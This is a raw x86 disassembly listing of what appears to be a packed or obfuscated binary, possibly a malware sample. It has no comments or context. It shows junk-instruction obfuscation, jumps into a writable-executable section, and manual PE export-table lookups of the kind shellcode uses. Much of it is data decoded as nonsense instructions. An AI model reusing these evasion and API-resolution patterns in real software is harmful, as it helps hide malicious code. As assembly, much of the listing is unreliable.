sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
ror di 0xe
lea edi [ 0xfffffffff59e35a9 ]
shr di 0xd
pushad
sub ecx 0x1
sub si cx
push ecx
bts di ax
mov [ ebp - 0x4 ] ecx
sub esp 0xffffffdc
shrd cx ax 0x6
not di
add esi 0x9f840703
mov ecx [ ebp - 0x8 ]
xadd si di
sar di 0xc
bts edi eax
add ecx [ ebp - 0x4 ]
pushfd
btr si si
not di
shr ecx 0x1
lea edi [ edx - 0x25f4a10 ]
bswap di
movsx di dl
stc
mov edi [ ebx + ecx * 4 ]
bsf si cx
bsf esi ebp
or si 0xe2a8
add edi eax
push [ esp ]
not esi
pop esi
pop esi
mov esi [ ebp + 0xc ]
mov edi [ edx + 0x1c ]
stc
add edi eax
cmp di 0x1c1b
stc
pushad
pushfd
mov edi [ edi + ecx * 4 ]
pushfd
push [ esp ]
test edi edi
jmp sub_4d6ea2
sub_4d4d54
pushad
lea esp [ esp + 0x28 ]
jne rwxdata
ror al 0x6
rcl al 0x2
movzx cx cl
mov ecx edi
not al
setae al
mov al [ ecx ]
jmp rwxdata
push 0x4726dfc8
sub edx edx
lea eax [ eax * 2 - 0x6ab5c6c2 ]
stc
ror al cl
mov eax edx
adc al ah
mov [ esp ] al
add edi 0x1
add al ah
rol al 0x3
mov al [ edi ]
mov [ esp ] 0xad
call sub_4d5138
push 0xa6a70422
jmp sub_50fb46
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
sub_4d4fe3
aas
lea eax [ 0xffffffffef54e4c6 ]
push ebp
sar al 0x1
bsr bp bp
aaa
aas
mov ebp esp
movzx ax cl
clc
pushad
rcl ax 0xc
sub esp 0xfffffff8
cwde
shl al cl
and ax ax
push esi
ror ax 0xc
push edi
btr ax 0xd
test bl 0x2d
pushfd
test cl dh
mov [ esp ] ebx
cmp dh 0xcf
rcr ax 0x3
push edx
neg eax
dec eax
mov eax [ ebp + 0x8 ]
cmp ah al
cmp bl dh
test eax eax
pushfd
jmp rwxdata
lea esp [ esp + 0x4 ]
je rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
shr dl 0x5
xchg si dx
xadd esi edx
mov esi [ eax + 0x3c ]
sar dx 0x5
cmp eax ecx
lea edx [ ecx - 0x77c41720 ]
add esi eax
setb dl
bts dx cx
test dl ah
lea edx [ ebp * 8 + 0x77cfcbdb ]
mov edx [ esi + 0x78 ]
cmp ebp ebx
stc
call sub_4dd310
or ecx ecx
pushfd
push [ esp ]
lea esp [ esp + 0xc ]
je rwxdata
movsx di bl
mov si si
mov di bp
push 0x4069a619
mov esi [ esp + 0x4 ]
not di
pushad
not di
mov edi [ esp + 0x28 ]
call sub_4d6b5e
xor ax 0x8ec1
xor ebx ebx
lea ecx [ ebx + 0x49f1e36f ]
das
shrd ecx ebx 0x1c
bt ax 0xa
mov [ ebp - 0x4 ] ebx
neg cl
rol cx 0x4
btc cx 0x9
mov eax edx
clc
xor cx di
neg ch
neg cx
shr eax 0x10
seta ch
movzx ecx bl
dec ecx
mov ecx [ esi + 0x4 ]
stc
or ecx ecx
pushad
pushfd
mov [ esp + 0x18 ] 0xe4
lea esp [ esp + 0x24 ]
je rwxdata
btc bx bx
xchg bx di
clc
pushfd
add [ ebp - 0x4 ] ecx
xor di ax
clc
stc
sub ecx 0x8
jmp rwxdata
shl bl 0x5
bsr bx dx
setbe bh
shr ecx 0x1
shr bl cl
mov edi [ esi ]
inc bh
shl bh 0x1
add edi [ ebp + 0x10 ]
stc
add esi 0x8
add esp 0x4
shr bh 0x5
bsr bx bp
bswap bx
neg bx
mov bx [ esi ]
cmp si 0x5f65
shr ebx 0xc
bt bp di
call sub_4d6037
lea esp [ esp + 0x8 ]
jne rwxdata
push 0x7bd1062d
pushad
call sub_4dd10a
call sub_51040d
mov ch 0x76
shl [ edx ] cl
sub ebx edx
leave
xchg ecx eax
adc cl [ esi - 0x62 ]
pop ebp
in al 0x79
dec edx
hlt
bsr edi esi
btr di si
mov edi [ edx + 0x24 ]
test esi 0xe4b698ce
pushad
test ah 0xfe
add edi eax
mov [ esp ] edi
test bl 0xe8
bt edi 0x1c
pushad
movzx ecx [ edi + ecx * 2 ]
bt sp 0x7
inc di
mov di cx
mov edi [ edx + 0x1c ]
cmp bl 0x95
clc
pushfd
add edi eax
pushfd
clc
cmc
mov edi [ edi + ecx * 4 ]
pushfd
cmc
test edi edi
mov [ esp ] cl
call j_sub_24bd45
dec edi
dec esp
inc ebp
inc ecx
push ebp
push esp
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax + eax * 8 - 0x2ddbfb3a ] al
pushfd
mov [ esp ] cl
call sub_4dd712
sub_4d50e4
lea esp [ esp + 0x10 ]
jne rwxdata
pushfd
pushfd
call sub_4d64d3
jmp rwxdata
jmp rwxdata
call sub_4d6015
push edx
push [ esp ]
pushfd
pushfd
lea esp [ esp + 0x10 ]
jmp rwxdata
pushad
bswap eax
mov eax ebp
pushfd
neg bl
stc
sbb bl 0xb9
mov bl 0x1
add esp 0x24
test ah 0x6d
js rwxdata
call sub_4d786c
clc
push esi
bsf si si
shrd si cx 0x5
mov esi edi
stc
stc
call sub_4d7c9a
lea esp [ esp + 0x28 ]
jne rwxdata
ror al 0x6
rcl al 0x2
movzx cx cl
mov ecx edi
not al
setae al
mov al [ ecx ]
jmp rwxdata
bsr ax di
mov ax 0x336e
bsr ax dx
sub edx edx
shr ax 0x9
and eax 0xc565c013
adc al ch
bt bx di
mov eax edx
push edx
test ax 0x731d
add edi 0x1
or al dl
add al ch
setbe al
mov al [ edi ]
cmc
cmp cl cl
jmp rwxdata
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
test al al
call sub_4dc222
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
sub_4d5231
lea esp [ esp + 0x8 ]
jae rwxdata
mov al 0x6a
seta al
push 0x55f02adc
pushad
lodsb [ esi ]
cmc
mov [ esp ] 0xe2
pushad
clc
rol al 0x7
jmp rwxdata
call sub_24add3
pushfd
add al 0x0
clc
bt bx 0x4
clc
clc
not al
mov [ esp + 0x10 ] 0xb27cfc3
clc
bt dx si
sub al 0x34
stc
shr eax 0x1
call sub_4db43a
adc eax 0x1da859dc
daa
jpe rwxdata
jns rwxdata
sti
ror [ ebp - 0x2c ] 0xed
frndint
cld
fstp st3
dec [ ebp - 0x8bf77c0 ]
add esp [ eax - 0x11 ]
daa
cmpsb [ esi ] [ edi ]
pop ebp
pop ebp
sub [ ebx + 0x36092388 ] dh
or [ esi - 0x59 ] ebx
pop esp
das
rcl [ edx ] cl
xchg ebx eax
test al 0x5f
insb
salc
aad 0x5f
outsd
push 0x5e
jns rwxdata
sti
pushfd
mov ecx 0x8a16120
std
cmp al 0x2f
pop ds
in eax 0x9
shl [ edi + 0xf ] 0x17
sub [ eax + 0x5b ] 0x68
out dx eax
dec eax
inc eax
retn
sub_4d525f
add ah 0x20
lea esp [ esp + 0x4 ]
pushad
jmp rwxdata
or al al
jmp rwxdata
pushfd
pushfd
jmp rwxdata
lea esp [ esp + 0x28 ]
je rwxdata
bt di dx
or ah ah
push 0x13376c9e
lea esp [ esp + 0x4 ]
je rwxdata
stc
cmp al ah
call sub_4da2d3
mov edi [ edx + 0x1c ]
stc
add edi eax
cmp di 0x1c1b
stc
pushad
pushfd
mov edi [ edi + ecx * 4 ]
pushfd
push [ esp ]
test edi edi
jmp sub_4d6ea2
push ecx
jmp rwxdata
jo rwxdata
pushad
push [ esp + 0x24 ]
retn 0x28
clc
test bx si
pushfd
cmp ah 0x2e
pushad
pushfd
push [ esp + 0x28 ]
retn 0x2c
cmp ah 0x2e
sub_4d535c
pushad
push edi
dec al
stc
pushfd
pushfd
xor al 0x7c
cmc
cmp sp si
push ecx
stc
neg al
bt ax di
bt ebp esi
mov [ esp ] esi
cmc
not al
clc
call sub_24bb10
fcom [ ecx + 0x62 ]
in al dx
push ecx
mov al [ 0x2592ff9b ]
int 0x43
sti
adc esi [ esi ]
inc ecx
add [ esi ] ebp
lds ecx [ eax ]
and eax 0x8172fd06
xor [ ecx + 0x1d ] 0xd1
push 0xffffff99
mov dl 0x41
salc
sub eax 0xc26075b8
out dx al
dec ebx
xchg ecx eax
out dx al
inc edi
mov edi 0x61e467cf
nop
cmpsd [ esi ] [ edi ]
iretd
sub_4d557e
lea esp [ esp + 0xc ]
ja rwxdata
cmc
cmc
sub edi 0x4
cmc
test al cl
push [ edi ]
stc
stc
stc
cmp edi ebx
pushfd
push 0x527ea9cf
call sub_4d557e
call sub_4de546
adc al cl
clc
sub ebx edi
or di 0xb276
add al ah
add ebx esp
jmp rwxdata
shl di cl
btr di 0xb
mov edi ebx
sub al ah
jmp rwxdata
jno rwxdata
pushfd
mov al 0x2e
pushfd
cmp ah 0x31
cmc
pushfd
[ edi ]
pushad
lea esp [ esp + 0x2c ]
jne rwxdata
cmp dl 0x8c
mov al 0x2e
test dh ah
stc
[ edi ]
push 0xbe1f1512
call sub_4fd852
add [ eax ] al
inc ebx
push 0x70557261
jo rwxdata
pushad
mov [ esp + 0xc ] cx
mov esp esi
pushad
pushad
pushfd
push ebp
lea esp [ esp + 0x48 ]
jmp rwxdata
setle ah
pushad
mov [ edi - 0x1 ] 0x0
setpo al
cwde
lea eax [ esp - 0x6d22dd68 ]
mov [ esp + 0x1c ] ebx
pushad
movsx ax bl
lea eax [ rwxdata ]
jmp rwxdata
sbb [ ebp - 0x2c ] 0xed
sub al 0xfa
dec ecx
mov ah 0xfa
or al 0xc3
push ss
pop ss
retn 0x86ce
jb rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
call sub_4d5524
sbb ch cl
sub al 0x54
fst [ edi ]
loop rwxdata
add [ edx - 0x136c5c7 ] bh
inc eax
frndint
iretd
xchg [ edx + 0x4d ] eax
xlat
pop esi
sub al 0x39
sub_4d559b
push 0x490467db
pushfd
pushfd
call sub_4fdad8
add [ eax ] al
pushad
and al 0x0
adc al 0x60
and al 0x0
sbb [ eax + 0x24 ] ah
add al al
push ebp
dec ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4db7 ] bh
add [ eax ] al
add [ eax ] al
add [ esi - 0x77 ] ah
and al 0x24
lea eax [ rwxdata ]
pushad
push 0x57864fdd
call sub_4d73ad
lea ebp [ esi + 0x12e3668f ]
0xae18
sub_4d56c9
mov edi [ ebp + 0x8 ]
call sub_4d8421
inc ecx
inc esp
push esi
inc ecx
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add al ch
pop edi
imul eax [ eax ] 0x0
sub_4d56e3
push edx
mov [ esp ] 0x2d
mov edi [ edi + ecx * 4 ]
bt di dx
lea esp [ esp + 0x3c ]
jb rwxdata
clc
bt di sp
test edi edi
push 0x870a8f36
lea esp [ esp + 0x4 ]
je rwxdata
cmc
test edi edi
pushfd
call sub_4da8a3
in al dx
dec ebp
shl [ ecx ] cl
push cs
in eax 0xdd
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
test bh 0xfa
bt ax 0x7
stc
clc
add eax edi
bt sp 0xf
pushfd
cmp eax edx
call sub_4de317
cmc
call sub_4d4452
sub_4d5e5c
shrd bx di 0xf
rol di 0x1
lea edi [ esi - 0x7697c5af ]
mov edi [ esi ]
bts bx 0x5
movzx bx al
sar bh cl
rcl bh cl
add edi [ ebp + 0x10 ]
shl bh cl
xor bx 0x7ca1
cmp bp 0x41d9
add esi 0x8
rcr bx 0xb
and bh ch
sar bh 0x4
mov bx [ esi ]
pushfd
sub esp 0xfffffff8
jb rwxdata
jmp rwxdata
shr ebx 0xc
bt bp dx
cmp ebx 0x1
pushfd
jmp sub_4db15f
clc
shr ebx 0xc
call sub_24b604
sbb [ ecx ] dl
adc ah cl
xchg ebp eax
imul ebp [ ecx - 0x49 ] 0xef8047ea
push ds
mov bh 0x92
in eax 0x1c
adc [ esi ] ecx
in eax 0x2
dec esp
inc ebp
unpcklps xmm4 xmm3
mov [ 0xffffffffd7c67c5f ] eax
jns rwxdata
nop
adc al 0xb7
mov dh 0xcf
adc [ ebx - 0xe23d8ef ] dh
dec eax
cmp [ esi - 0x5ff70b80 ] edi
cmp edx [ edx - 0x26f4d76a ]
push 0x5aeb6b65
loopne rwxdata
push 0xffffffb9
popad
mov al 0x5
adc cl cl
fisub [ ebx - 0x48003044 ]
pop ebp
add eax 0x5465c82d
xchg esp eax
adc al 0xa5
sar [ ebp + 0x6a ] 0x1
mov ecx 0x9412eff0
or dh [ ecx ]
scasb [ edi ]
pop es
dec ecx
fiadd [ eax ]
out 0xea al
or edi [ ecx ]
mov edi 0xe8f0f28e
mov esp 0x17819648
pop ds
leave
out dx eax
pop edi
jmp rwxdata
sub_4d5eb1
pushad
call sub_24bf86
test edx esi
bt sp bp
push 0xd003aa77
pushad
cmp eax 0x7d00
mov [ esp + 0x4 ] ah
call sub_4d732d
xchg esp eax
xor ebp [ ebx + ebx * 8 ]
je rwxdata
add al [ eax ]
adc [ edx ] dh
and edx edx
pop edi
xchg esi eax
adc edi [ 0x59e4ed16 ]
push 0xffffffd4
inc ecx
mov al 0x20
out dx eax
dec esp
shl [ edx + edx * 4 + 0x629fa247 ] 0x1
push ebp
dec ebp
sub edx [ eax - 0x42ee1ecf ]
and [ ecx - 0x56e63bbb ] esp
sbb eax 0xd14cef6b
sub [ ebx ] edi
dec esi
sub_4d6015
test esi esp
cmp cx 0xa6bf
test bh 0x76
call j_sub_4d7652
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
outsd
cld
or eax [ ebx + 0x6b37c07f ]
xchg [ ebx + ebp * 2 - 0x416bc434 ] ebx
aaa
sbb [ edx ] ebp
fld [ edx - 0x4f ]
dec ebp
popad
je rwxdata
mov [ ebx + esi * 2 ] dh
cmp al 0xf3
pop ax
int1
pushad
or edx [ eax + 0x584c390f ]
adc cl bh
inc esi
test [ esi ] ch
int1
test [ ebx + 0x39 ] ch
or [ ecx - 0x212ce455 ] ch
lahf
hlt
cmp [ edi - 0x40 ] 0x37
imul eax [ edi + 0x3bcc6b9c ] 0xffffff94
mov esi 0xd92a1937
inc edx
mov cl 0x4d
dec ecx
outsb
jae rwxdata
popad
outsb
arpl [ ebp ] sp
sub_4d6037
clc
cmp ebx 0x1
pushad
push [ esp + 0x4 ]
jmp rwxdata
call sub_4db88c
xlat
fstp [ esi + 0x5e ]
ficomp [ ecx - 0x27 ]
adc bl [ edi - 0x64 ]
push ebp
and [ eax - 0x78 ] 0x34
and al 0x88
sub_4d6231
mov [ esp ] 0x70
push [ esp ]
call sub_4ddd38
lea esp [ esp + 0x30 ]
je rwxdata
movsx di bl
mov si si
mov di bp
push 0x4069a619
mov esi [ esp + 0x4 ]
not di
pushad
not di
mov edi [ esp + 0x28 ]
call sub_4d6b5e
setno bl
add [ ebp - 0x4 ] ecx
neg edi
and di 0xdbae
stc
shl bl cl
sub ecx 0x8
neg di
setae bl
or di 0x1771
shr ecx 0x1
call sub_4d5e5c
or ch cl
0x8174
_start
pushad
mov [ esp + 0x1c ] 0x4b047b48
push [ esp ]
push [ esp + 0x4 ]
pushfd
mov [ esp + 0x24 ] 0x9548087
push 0xe91208df
lea esp [ esp + 0x28 ]
jmp rwxdata
jmp rwxdata
pushfd
pushad
mov [ esp + 0x20 ] ecx
pushad
mov [ esp + 0x4 ] esp
mov [ esp + 0x4 ] 0x87
push 0x8aa8260c
mov [ esp + 0x40 ] ebp
mov [ esp + 0x8 ] 0xef
mov [ esp ] 0x67
pushfd
mov [ esp + 0x40 ] eax
lea esp [ esp + 0x40 ]
jpe rwxdata
push 0xdd048c91
pushfd
pushfd
pushad
mov [ esp + 0x28 ] esi
jmp rwxdata
pushfd
pushad
pushad
mov [ esp + 0x40 ] esi
mov [ esp + 0x4 ] 0x8a63
push 0x8406a7de
pushfd
mov [ esp + 0x44 ] edi
jmp rwxdata
mov [ esp + 0x24 ] edi
pushad
push 0xbce76aa9
push 0x6eca622c
pushfd
mov [ esp + 0x4c ] ecx
mov [ esp ] 0xce07
mov [ esp + 0x48 ] edx
push 0xafd6aa85
jmp rwxdata
mov [ esp ] ch
push 0x388552e1
pushfd
mov [ esp + 0x48 ] ecx
call sub_51364c
call sub_5141a3
sub_4d63fc
pushfd
lea esp [ esp + 0x28 ]
je rwxdata
setle cl
rol cl cl
stc
btr cx 0x3
mov edi edx
ror al 0x6
rcl al 0x2
movzx cx cl
mov ecx edi
not al
setae al
mov al [ ecx ]
jmp rwxdata
test dl bh
bt bx sp
bt si 0x1
sub al 0x30
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
cmc
cmp al 0x9
jmp sub_2499a2
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
sub_4d64d3
push 0x309d4b1c
xchg ecx eax
jmp rwxdata
pushad
dec eax
clc
shl eax 0x8
setne al
push edx
not al
setpo al
lodsb [ esi ]
call sub_50fb3b
sub_4d6610
lea esp [ esp + 0x48 ]
je rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
pushfd
mov [ esp ] dh
add eax edi
cmc
mov [ esp ] 0x57
pushad
cmp eax edx
call sub_4fe853
call sub_4d7f08
mov cl 0x8a
mov [ 0xffffffffae26cf52 ] eax
dec eax
enter 0x40f 0x3c
inc ecx
and eax 0x9fa25724
test al 0x5f
pop esp
out 0x43 al
mov dl 0x7f
jbe rwxdata
push ds
pop es
sub_4d6b5e
setne bh
push [ esp + 0x4 ]
setle bh
mov ebx [ esp + 0x34 ]
mov [ esp + 0x10 ] bh
mov ecx [ esp + 0x38 ]
mov [ esp ] cx
mov [ esp ] bl
call sub_24bff1
lea esp [ esp + 0x28 ]
je rwxdata
bt di dx
or ah ah
push 0x13376c9e
lea esp [ esp + 0x4 ]
je rwxdata
stc
cmp al ah
call sub_4da2d3
mov edi [ edx + 0x1c ]
stc
add edi eax
cmp di 0x1c1b
stc
pushad
pushfd
mov edi [ edi + ecx * 4 ]
pushfd
push [ esp ]
test edi edi
jmp sub_4d6ea2
push ecx
jmp rwxdata
jo rwxdata
pushad
push [ esp + 0x24 ]
retn 0x28
clc
test bx si
pushfd
cmp ah 0x2e
pushad
pushfd
push [ esp + 0x28 ]
retn 0x2c
cmp ah 0x2e
sub_4d6e19
pushfd
lea esp [ esp + 0x4c ]
call sub_4d6015
js rwxdata
test edx esi
bt sp bp
push 0xd003aa77
pushad
cmp eax 0x7d00
mov [ esp + 0x4 ] ah
call sub_4d732d
xchg esp eax
xor ebp [ ebx + ebx * 8 ]
je rwxdata
bt si cx
cmp eax 0x7d00
push edi
call sub_4fd9ce
call sub_4d6015
push edx
push [ esp ]
pushfd
pushfd
lea esp [ esp + 0x10 ]
jmp rwxdata
add al [ eax ]
adc [ edx ] dh
and edx edx
pop edi
xchg esi eax
adc edi [ 0x59e4ed16 ]
push 0xffffffd4
inc ecx
mov al 0x20
out dx eax
dec esp
shl [ edx + edx * 4 + 0x629fa247 ] 0x1
push ebp
dec ebp
sub edx [ eax - 0x42ee1ecf ]
and [ ecx - 0x56e63bbb ] esp
sbb eax 0xd14cef6b
sub [ ebx ] edi
dec esi
pushad
bswap eax
mov eax ebp
pushfd
neg bl
stc
sbb bl 0xb9
mov bl 0x1
add esp 0x24
test ah 0x6d
js rwxdata
call sub_4d786c
clc
push esi
bsf si si
shrd si cx 0x5
mov esi edi
stc
stc
call sub_4d7c9a
lea esp [ esp + 0x28 ]
jne rwxdata
ror al 0x6
rcl al 0x2
movzx cx cl
mov ecx edi
not al
setae al
mov al [ ecx ]
jmp rwxdata
bsr ax di
mov ax 0x336e
bsr ax dx
sub edx edx
shr ax 0x9
and eax 0xc565c013
adc al ch
bt bx di
mov eax edx
push edx
test ax 0x731d
add edi 0x1
or al dl
add al ch
setbe al
mov al [ edi ]
cmc
cmp cl cl
jmp rwxdata
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
test al al
call sub_4dc222
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
sub_4d6ea2
lea esp [ esp + 0x2c ]
je rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
push 0x3c04433f
pushad
add eax edi
cmc
bt dx ax
call sub_4fd846
sub_4d732d
lea esp [ esp + 0x28 ]
jae rwxdata
push edx
dec bl
pushfd
inc ecx
lea esp [ esp + 0x8 ]
push 0xd15bea57
mov [ esp ] bx
mov [ esp ] 0xde
cmp ah 0x5
pushfd
push ebx
pushfd
pushfd
lea esp [ esp + 0x14 ]
jae rwxdata
call sub_4d786c
clc
push esi
bsf si si
shrd si cx 0x5
mov esi edi
stc
stc
call sub_4d7c9a
lea esp [ esp + 0x28 ]
jne rwxdata
setns bl
pushad
dec bl
inc ecx
lea esp [ esp + 0x20 ]
cmp edi ebx
cmp bh 0xcd
stc
test dx bp
cmp eax 0x7f
push ecx
mov [ esp ] 0x6bfa
pushfd
push ebx
lea esp [ esp + 0xc ]
ja rwxdata
ror al 0x6
rcl al 0x2
movzx cx cl
mov ecx edi
not al
setae al
mov al [ ecx ]
jmp rwxdata
bsr ax di
mov ax 0x336e
bsr ax dx
sub edx edx
shr ax 0x9
and eax 0xc565c013
adc al ch
bt bx di
mov eax edx
push edx
test ax 0x731d
add edi 0x1
or al dl
add al ch
setbe al
mov al [ edi ]
cmc
cmp cl cl
jmp rwxdata
and bl al
rol bl cl
xchg ebp eax
pushad
bswap eax
mov eax ebp
pushfd
neg bl
stc
sbb bl 0xb9
mov bl 0x1
add esp 0x24
test ah 0x6d
js rwxdata
inc bl
mov bl ch
inc ecx
dec bl
call sub_4d793e
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
test al al
call sub_4dc222
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
sub_4d7382
stc
push [ edi ]
pop [ esp + 0x8 ]
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] 0xb1e4
cmp edi ebx
push edx
lea esp [ esp + 0xc ]
ja rwxdata
cmc
cmc
sub edi 0x4
cmc
test al cl
push [ edi ]
stc
stc
stc
cmp edi ebx
pushfd
push 0x527ea9cf
call sub_4d557e
call sub_4de546
sub al 0x60
sar al 0x7
dec al
call sub_4d30c1
sub_4d73ad
call sub_4d2ec7
mov al [ 0xffffffffab5c2c31 ]
and [ edx - 0xe68d130 ] edi
0xfa3e26b3 0xc1a7
loope rwxdata
add [ eax ] ch
sar al 0x7
dec al
call sub_4d30c1
scasd [ edi ]
in eax 0x7e
fadd [ esi ]
cmc
adc esp [ esi ]
das
cdq
mov edi 0x2ae8dbc3
test edi esp
mov al [ 0xffffffffc2025918 ]
xchg ebp eax
imul edx [ ebx ] 0x494ea0e1
inc edi
outsb
mov esi 0x621fb14d
insb
sbb bl [ ebp - 0x2d ]
or ecx [ ebx - 0x4d ]
sbb [ esi ] ebp
clc
add ebp [ edx ]
push es
dec ecx
daa
dec edi
loopne rwxdata
fstp [ ebp - 0x4815ab71 ]
sbb [ edi - 0x4066c1d1 ] ecx
retn
xor esp [ esi - 0x2a660d42 ]
out 0xa0 eax
bound ebp [ ebp + 0x36 ]
call 0xffffffffff365206
mov [ 0xffffffff97640c58 ] eax
fcmovne st3
std
inc bx
fist [ eax - 0x58bf7a25 ]
mov ecx 0x660ef772
0x91067352 0x7f1e
dec edx
cmp eax 0x8d76c93a
sub al 0x1
cmpsb [ esi ] [ edi ]
test al 0x85
jl rwxdata
dec esi
jpe rwxdata
fst [ esi - 0x66 ]
mov eax [ 0x5c5a95ed ]
add eax 0x7dca4ff2
cmpsb [ esi ] [ edi ]
shr [ ebp - 0x69c635bf ] 0x1
mov eax 0x4ed6091
add eax esi
or al 0xcf
fistp [ edx ]
fwait
push ebx
or edi [ edx ]
sub esi [ eax - 0x6a ]
push ebp
aad 0x49
sahf
out dx al
test eax 0x294800b7
scasb [ edi ]
in eax dx
mov dh 0x27
sub edx eax
mov [ edi + ecx * 4 ] gs
imul ebp [ edx + 0x195651a6 ] 0x33f32bff
mov cl 0xb2
push esi
push esp
or [ esi + 0x70 ] 0xe
aam 0xe4
out 0x70 eax
and cl dh
add [ edi - 0x2c ] dh
and ebx [ esi ]
sti
dec ebx
jle rwxdata
xor esi [ ecx + 0x6856241 ]
sub edi [ ecx + 0x1b ]
fyl2xp1
sbb bl ch
push esi
0x5a95eda1 0x55c
dec edi
0xa67d
sbb [ edi + 0x3c ] 0x76
aaa
rcr [ edx + 0x4d ] 0x6c
mov fs bp
add dl [ edx + 0x878d2ce ]
xor eax 0xfbe4e842
aaa
inc esi
nop
nop [ eax + 0x55 ] esi
daa
adc bh ah
sbb [ esi - 0x642c9ed ] ecx
jae rwxdata
add [ ebx + 0x1a2e4ffd ] ebp
or eax 0xa9de0af9
xchg [ esi + 0x2e999644 ] ch
cmp eax 0xcdeeb55b
outsd
movsb [ edi ] [ esi ]
xchg esp eax
cmp edx esp
add al 0xf
stc
jmp 0x45774f12
pushfd
xchg edi eax
inc edi
or [ eax ] ch
stosd [ edi ]
rcr [ esi + 0x29a152e9 ] 0xac
xchg edi eax
sub [ eax - 0x72e540ed ] bh
xchg edi eax
mov ah 0x86
insd
inc esi
jb rwxdata
or ebx [ esp + edi * 4 ]
cmpsb [ esi ] [ edi ]
shl [ edx - 0x6f ] 0x1
cmp [ edi + edx * 4 - 0x54d7f7b9 ] ebx
mov [ 0xffffffffb9094271 ] al
mov [ ebp - 0x2f3127e6 ] dh
cli
inc esi
sbb ebx [ eax ]
out dx eax
cmp cl [ eax ]
inc ecx
add esp 0x36
stc
mov edi ss
xchg [ esi - 0x738a075d ] esp
and [ edi ] ah
xor [ edi ] ebp
stosb [ edi ]
imul eax [ edi ] 0xf1f6d5ed
into
mov [ 0xffffffffab4d5841 ] eax
nop
mov esi 0x76a7131
inc edi
inc ebp
neg [ 0xffffffffee6f6c6d ]
mov al 0x73
cmc
aaa
sti
fcom st5
or eax 0xe3cf0cc8
out 0x39 al
push ss
adc dl bl

sub_4d7783
pushfd
lea esp [ esp + 0x34 ]
ja rwxdata
cmc
call sub_4fea6f
mov [ esp + 0x24 ] 0x47586ff8
push [ esp + 0x4 ]
mov [ esp + 0x4 ] 0x71
pushfd
push eax
lea esp [ esp + 0x30 ]
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
jb rwxdata
pushfd
pushad
mov [ esp + 0x8 ] sp
mov [ esp + 0x20 ] ecx
call sub_512539
jmp rwxdata
call sub_510a92
cmp ecx [ ebp - 0x8 ]
jmp rwxdata
cld
int 0x77
je rwxdata
arpl [ edi + 0x3fc847b0 ] bx
mov dl cl
sar [ ebp + 0x78 ] cl
mov ch 0x7e
jne rwxdata
pushfd
lea esp [ esp + 0x4 ]
jbe rwxdata
0x7d3dc659 0x5471
dec ecx
sti
fisub [ ecx + 0x4d ]
jl rwxdata
dec edi
cmpsb [ esi ] [ edi ]
stc
inc esi
stosd [ edi ]
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
